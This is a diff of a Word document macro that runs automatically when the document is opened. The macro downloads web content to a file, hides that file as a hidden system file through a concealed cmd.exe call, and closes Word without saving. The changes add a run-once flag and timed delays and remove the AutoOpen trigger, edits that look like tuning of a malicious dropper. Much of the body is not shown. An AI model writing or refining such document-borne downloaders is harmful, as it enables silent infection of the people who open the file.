@@ -1,4 +1,8 @@
 Private Sub Document_Open()
+    If bAlreadyRun Then Exit Sub
+    bAlreadyRun = True
+    
+  
     Dim scriptUrl As String
     Dim savePath As String
     Dim webContent As String
@@ -58,7 +62,11 @@ Private Sub Document_Open()
         Close #fileHandle
     
     
-        
+        Dim startTime1 As Double
+        startTime1 = Timer
+        Do While Timer < startTime1 + 6
+            DoEvents
+        Loop
        
         Shell "cmd.exe /c attrib +H +S """ & savePath & """", vbHide
         
@@ -76,7 +84,7 @@ Private Sub Document_Open()
         
         Dim startTime As Double
         startTime = Timer
-        Do While Timer < startTime + 7
+        Do While Timer < startTime + 3
             DoEvents
         Loop
 
@@ -97,6 +105,7 @@ Private Sub Document_Open()
         
        
         Application.Quit SaveChanges:=wdDoNotSaveChanges
+    
     End If
 
     
@@ -109,10 +118,6 @@ ErrorHandler:
     Exit Sub
 End Sub
 
-
-Sub AutoOpen()
-    Document_Open
-End Sub
 
 Function DownloadWithWinHttp(url As String) As String
    
